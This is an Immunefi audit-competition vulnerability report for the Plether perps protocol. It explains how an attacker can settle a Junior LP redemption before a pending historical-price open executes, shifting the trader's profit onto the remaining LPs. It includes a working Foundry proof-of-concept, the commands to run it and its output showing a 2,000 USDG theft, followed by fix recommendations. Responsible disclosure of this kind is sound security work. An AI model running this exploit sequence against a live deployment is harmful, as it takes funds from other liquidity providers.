# \#99589 [SC-Critical] Pending historical open lets a Junior LP exit before its already-fixed trader liability

**Submitted on Nov 14th 2026 at 11:52:22 UTC by @andro for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99589
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
A committed open has no representation in terminal LP NAV until it executes. This is unsafe because Plether intentionally executes the order at the unique historical Pyth tick after commitment even when a newer Engine mark already exists.

## Vulnerability Details
An attacker can therefore:

1. mature a controlled Junior redemption and commit an open;
2. wait until the order's historical execution tick is known and a newer mark makes that open immediately profitable;
3. refresh the Engine and fund/claim the Junior redemption while the account is still flat, so terminal NAV contains no liability for the pending open;
4. execute the open at the older authenticated tick, retaining the newer Engine mark; and
5. close at that current mark, realizing the trader profit against only the remaining Pool.

The differential PoC compares this sequence with the economically canonical ordering in which the same historical open and trader payout are recognized before the LP redemption. The trader ends with the same balance and both orders execute at the same prices. Only ownership timing differs: redeem-before-open pays the controlled LP 2,000 USDG more and leaves Pool custody 2,000 USDG lower.

## Root Cause

The broken invariant is:

> Once an order has an authenticated historical execution price, an LP epoch must not transfer ownership past that economic event unless the pending order's conservative effect is reserved or the older execution is invalidated.

`PletherOracle` keeps the unique post-commit historical basket as the execution source even if storage contains newer prices. Before the open executes, however, `TerminalNavBookV2.terminalNavSnapshot` sees zero open interest and returns no terminal delta:

```solidity
snapshot.hasOpenPositions = totalOpenInterest != 0;
uint256 markPrice = engine.lastMarkPrice();
uint64 markTime = engine.lastMarkTime();
...
if (snapshot.hasOpenPositions) {
    snapshot.terminalLpPriceDeltaAssets = _terminalLpPriceDeltaAssetAtoms(uint32(markPrice));
}
```

`HousePool._settleLpEpoch` reconciles and funds the redemption using that zero-liability snapshot:

```solidity
_reconcile(accountingSnapshot, statusSnapshot);
...
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
...
juniorPhase = _fundRedemptionPhase(
    juniorVault, result.cutoffEpoch, juniorPhase, _settlementFeeBps(false, statusSnapshot.oracleFrozen)
);
```

The pending order's committed margin is isolated trader custody, not a Pool-liability reservation. No Pool or Router check prevents the epoch from settling while the open remains executable.

After the LP assets are irreversibly moved into redemption escrow, `_applyOpen` explicitly permits a historical fill to predate the cached mark and only then creates/synchronizes the position curve:

```solidity
if (pos.lots > 0) {
    _realizeCarryFromSettlement(delta.account, pos);
} else {
    // A historical fill can predate the cached mark, so settlement may leave mark state untouched.
    _advanceAllCarryIndexes(block.timestamp);
}
...
settlementSidecar.executeOpen(delta, currentPosition, publishTime);
_endTerminalCurveMutation(delta.account, expectedOldHash);
```

Live execution checks confirm that the remaining Pool can support the position, but they do not charge the exited cohort for the liability whose price was already fixed before its redemption. The root cause is the missing pending-open reservation/serialization boundary between historical order execution and LP epoch ownership settlement.

## Internal Preconditions

- The attacker controls Junior shares with a matured redemption request.
- The attacker controls a funded trader account and commits an ordinary open.
- The order remains within its execution deadline and has a valid unique historical Pyth basket.
- After the redemption, remaining Pool capital is sufficient for the open's normal live solvency and risk checks.
- Pool cash is sufficient to fund the LP redemption and later trader payout.

## External Preconditions

- After commitment, the market moves so the historical open price and the newer current mark give the trader an unrealized profit. The PoC uses a LONG at 1.00 and the protocol's profitable LONG direction at a retained 0.80 mark.
- The attacker orders permissionless LP settlement before permissionless order execution. A contract can make both calls sequentially in one transaction once the oracle data is available.

No privileged configuration, fake price, unsupported token, public-network transaction, or malicious keeper assumption is used.

## Attack Path

1. The attacker requests redemption of 10% of an incumbent Junior position and waits for normal maturity.
2. The controlled trader funds 30,000 USDG and commits a 100,000-size LONG with 20,000 USDG margin.
3. Pyth publishes the unique post-commit execution tick at 1.00.
4. A newer authenticated mark of 0.80 becomes available.
5. The attacker refreshes the Engine to 0.80 while the trader is still flat.
6. The attacker settles and claims the matured Junior redemption. Because the open is pending, terminal NAV contains no position liability.
7. The attacker executes the open with the authenticated 1.00 historical data. The Engine retains the newer 0.80 mark and creates a `-20,000 USDG` LP terminal delta.
8. The attacker commits and executes a full close at 0.80, realizing the identical trader payout used in the control branch.
9. The controlled LP has received exactly 2,000 USDG more than if the open had executed before epoch settlement. Remaining Pool custody is exactly 2,000 USDG lower.

## Impact Details
Direct theft of user funds. The controlled Junior LP exits at a price that omits a pending open. The same open then executes at its older authenticated price, is immediately profitable at the retained current mark, and the trader realizes that profit against only the remaining LP cohort. The focused PoC transfers exactly 2,000 USDG to a controlled 10% Junior exit and leaves actual Pool USDG custody exactly 2,000 USDG lower.

## References
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L610-L628

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TerminalNavBookV2.sol#L208-L235

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1286-L1303

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L77

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L794-L888


## Proof of Concept

## Proof of Concept
Create `packages/perps/test/perps/accounting/RH094PendingHistoricalOpenJuniorRedemptionDifferential.t.sol` with the following code:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {HousePoolAsyncTestBase} from "../shared/HousePoolTestBase.sol";

contract RH094PendingHistoricalOpenJuniorRedemptionDifferentialTest is HousePoolAsyncTestBase {
    address private constant TRADER = address(0x9401);
    address private constant KEEPER = address(0x9402);

    uint256 private constant SIZE = 100_000e18;
    uint256 private constant MARGIN = 20_000e6;
    uint256 private constant HISTORICAL_OPEN_PRICE = 1e8;
    uint256 private constant RETAINED_MARK = 0.8e8;

    struct Outcome {
        uint256 redeemedAssets;
        uint256 traderBalance;
        uint256 poolAssets;
        uint256 poolCustody;
        uint256 juniorPrincipal;
        uint256 juniorSupply;
        uint256 executionPrice;
        IOrderRouterAccounting.OrderStatus openStatus;
        IOrderRouterAccounting.OrderStatus closeStatus;
        uint256 positionSize;
        int256 terminalDelta;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0;
        params.baseCarryBps = 0;
        params.maxSkewRatio = 1e18;
    }

    function test_PendingHistoricalOpenAfterJuniorExitShiftsTraderPayoutToRemainingLps() public {
        _finishAsyncCooldown(juniorVault, address(this));
        uint256 redeemShares = juniorVault.balanceOf(address(this)) / 10;
        assertGt(redeemShares, 0, "fixture requires incumbent Junior shares");
        uint256 redeemId = _requestAsyncRedeem(juniorVault, address(this), redeemShares);
        uint256 maturity = pool.lpEpochStart(redeemId);
        if (block.timestamp < maturity) vm.warp(maturity);

        _fundTrader(TRADER, 30_000e6);
        vm.prank(TRADER);
        uint64 openId = router.commitOrder(CfdTypes.Side.LONG, SIZE, MARGIN, 0, false);
        uint256 openCommitTime = vm.getBlockTimestamp();

        vm.warp(vm.getBlockTimestamp() + 2);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 historicalPublishTime = vm.getBlockTimestamp();
        bytes[] memory historicalOpenData =
            _pricedPayload(historicalPublishTime, openCommitTime, HISTORICAL_OPEN_PRICE);

        vm.warp(vm.getBlockTimestamp() + 5);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 retainedPublishTime = vm.getBlockTimestamp();
        bytes[] memory retainedMarkData =
            _pricedPayload(retainedPublishTime, historicalPublishTime, RETAINED_MARK);

        uint256 branchPoint = vm.snapshotState();
        Outcome memory redeemThenOpen =
            _run(redeemId, openId, historicalOpenData, retainedMarkData, true);
        assertTrue(vm.revertToState(branchPoint));
        Outcome memory openThenRedeem =
            _run(redeemId, openId, historicalOpenData, retainedMarkData, false);

        emit log_named_uint("redeem then open assets", redeemThenOpen.redeemedAssets);
        emit log_named_uint("open then redeem assets", openThenRedeem.redeemedAssets);
        emit log_named_uint(
            "controlled LP excess assets", redeemThenOpen.redeemedAssets - openThenRedeem.redeemedAssets
        );
        emit log_named_uint("historical open execution price", redeemThenOpen.executionPrice);
        emit log_named_uint("redeem then open pool custody", redeemThenOpen.poolCustody);
        emit log_named_uint("open then redeem pool custody", openThenRedeem.poolCustody);

        assertEq(uint8(redeemThenOpen.openStatus), uint8(IOrderRouterAccounting.OrderStatus.Executed));
        assertEq(uint8(openThenRedeem.openStatus), uint8(IOrderRouterAccounting.OrderStatus.Executed));
        assertEq(uint8(redeemThenOpen.closeStatus), uint8(IOrderRouterAccounting.OrderStatus.Executed));
        assertEq(uint8(openThenRedeem.closeStatus), uint8(IOrderRouterAccounting.OrderStatus.Executed));
        assertEq(redeemThenOpen.executionPrice, HISTORICAL_OPEN_PRICE);
        assertEq(openThenRedeem.executionPrice, HISTORICAL_OPEN_PRICE);
        assertEq(redeemThenOpen.positionSize, 0);
        assertEq(openThenRedeem.positionSize, 0);
        assertEq(redeemThenOpen.terminalDelta, 0);
        assertEq(openThenRedeem.terminalDelta, 0);
        assertEq(redeemThenOpen.traderBalance, openThenRedeem.traderBalance, "trader payout must match");
        assertEq(redeemThenOpen.juniorSupply, openThenRedeem.juniorSupply);

        uint256 excessRedemption = redeemThenOpen.redeemedAssets - openThenRedeem.redeemedAssets;
        assertGt(excessRedemption, 0, "controlled Junior LP must exit ahead of the pending liability");
        assertEq(
            openThenRedeem.poolAssets - redeemThenOpen.poolAssets,
            excessRedemption,
            "remaining LP value must fall by the controlled LP's excess redemption"
        );
        assertEq(
            openThenRedeem.poolCustody - redeemThenOpen.poolCustody,
            excessRedemption,
            "the loss must be an actual settlement-token custody loss"
        );
    }

    function _run(
        uint256 redeemId,
        uint64 openId,
        bytes[] memory historicalOpenData,
        bytes[] memory retainedMarkData,
        bool redeemFirst
    ) private returns (Outcome memory outcome) {
        _startRecordingLogs();
        if (redeemFirst) {
            vm.prank(KEEPER);
            router.updateMarkPrice(retainedMarkData);
            _settleLpEpochForTest();
            (, outcome.redeemedAssets) = _claimAsyncRedeem(juniorVault, redeemId, address(this));
            vm.prank(KEEPER);
            router.executeOrder(openId, historicalOpenData);
        } else {
            vm.prank(KEEPER);
            router.executeOrder(openId, historicalOpenData);
            vm.prank(KEEPER);
            router.updateMarkPrice(retainedMarkData);
        }

        OrderV3Types.OrderReceipt memory openReceipt = _verifiedReceipt(router.lifecycleBook(), openId);
        outcome.executionPrice = openReceipt.executionPrice;
        outcome.openStatus = _orderRecord(openId).status;

        vm.prank(TRADER);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
        uint256 closeCommitTime = vm.getBlockTimestamp();
        vm.warp(vm.getBlockTimestamp() + 2);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory closeData = _pricedPayload(vm.getBlockTimestamp(), closeCommitTime, RETAINED_MARK);
        vm.prank(KEEPER);
        router.executeOrder(closeId, closeData);

        if (!redeemFirst) {
            _settleLpEpochForTest();
            (, outcome.redeemedAssets) = _claimAsyncRedeem(juniorVault, redeemId, address(this));
        }

        outcome.closeStatus = _orderRecord(closeId).status;
        outcome.traderBalance = clearinghouse.balanceAssets(TRADER);
        outcome.poolAssets = pool.totalAssets();
        outcome.poolCustody = settlementToken.balanceOf(address(pool));
        outcome.juniorPrincipal = pool.juniorPrincipal();
        outcome.juniorSupply = juniorVault.accruedTotalSupply();
        (outcome.positionSize,,,,,,) = engine.positions(TRADER);
        ICfdEngineTypes.TerminalNavSnapshot memory terminal = engine.terminalNavSnapshot();
        outcome.terminalDelta = terminal.terminalLpPriceDeltaAssets;
    }

    function _pricedPayload(
        uint256 publishTime,
        uint256 previousPublishTime,
        uint256 price
    ) private pure returns (bytes[] memory data) {
        bytes32[] memory feedIds = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(
                feedIds[i],
                MockPyth.MockPrice(int64(uint64(price)), 0, int32(-8), publishTime, previousPublishTime)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }
}
```

Run from `packages/perps` at frozen commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`:

```bash
forge test --match-path test/perps/accounting/RH094PendingHistoricalOpenJuniorRedemptionDifferential.t.sol --match-test test_PendingHistoricalOpenAfterJuniorExitShiftsTraderPayoutToRemainingLps -vv
```

Observed output:

```text
[PASS] test_PendingHistoricalOpenAfterJuniorExitShiftsTraderPayoutToRemainingLps() (gas: 9660536)
Logs:
  redeem then open assets: 100099997258
  open then redeem assets: 98099997258
  controlled LP excess assets: 2000000000
  historical open execution price: 100000000
  redeem then open pool custody: 881900002742
  open then redeem pool custody: 883900002742

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

All asset values use six decimals. The controlled LP gain and Pool custody loss are therefore exactly 2,000 USDG.

## Expected Result

An LP epoch that transfers ownership after a committed order's authenticated historical tick must reserve that order's conservative liability, execute/terminalize it first, or invalidate execution at a price preceding the epoch watermark. Executing the same trade and LP redemption in opposite administrative orderings must not transfer value between the exiting and remaining LP cohorts.

## Observed Result

The epoch treats the trader as flat and fully funds the Junior exit. The historical open remains executable afterward and creates an immediate 20,000 USDG trader profit at the retained mark. A 10% controlled exit receives 2,000 USDG extra, exactly matched by lower remaining Pool custody.

## Recommendation

Serialize historical order economics with LP ownership settlement. A robust fix can use one of these approaches:

- prevent an LP epoch from funding entry or exit while any executable order has a historical window/tick preceding the proposed epoch mark;
- terminalize all such FIFO orders before transferring LP ownership;
- establish a monotonic epoch accounting watermark and reject execution prices older than it; or
- include a conservative pending-open liability in terminal NAV until the order executes or terminalizes.

The fix must cover opens as well as closes and must be enforced on-chain. Add a regression comparing `redeem -> historical open -> close` with `historical open -> close -> redeem`, requiring equal aggregate LP ownership after identical trader settlement.

